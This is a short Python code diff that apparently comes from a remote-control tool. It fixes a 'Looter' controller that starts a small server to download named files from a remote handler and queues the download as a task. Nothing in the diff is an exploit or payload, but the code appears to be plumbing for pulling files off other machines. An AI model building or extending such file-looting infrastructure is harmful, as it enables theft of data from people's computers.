@@ -2,6 +2,7 @@ from multiprocessing import Pipe
 from typing import Callable, Union
 from time import sleep
 
+from .micro import MicroServer
 
 class BasicControler:
     def __init__(self, pipe : Pipe, server_callback : Callable):
@@ -251,9 +252,15 @@ class LooterControler(BasicControler):
     def __init__(self, pipe : Pipe, server_callback: object):
         super().__init__(pipe, server_callback)
         self.name = "GypsyKing Controler"
+        self._xtraServ = MicroServer
+        self.server = server_callback
 
     def setCoordinates(self, fname: str, flen: str, handler: object) -> None:
-        xtra = self.server.__xtraServ(self.server, flen, fname)
+        try:
+            flen = int(flen)
+        except (ValueError, TypeError):
+            self.server.Msg(f"[!!] ERROR: LOOTER recive file_len bad values: {flen} [!!]", dev=True)
+        xtra = self._xtraServ(self.server, flen, fname)
         self.server.Tasker.addTask(name="Looter Downloader", func_name=xtra.START, info="Download file threading", types="handlers")
         handler.sendMsg(f"1 {str(xtra.port)}")
     
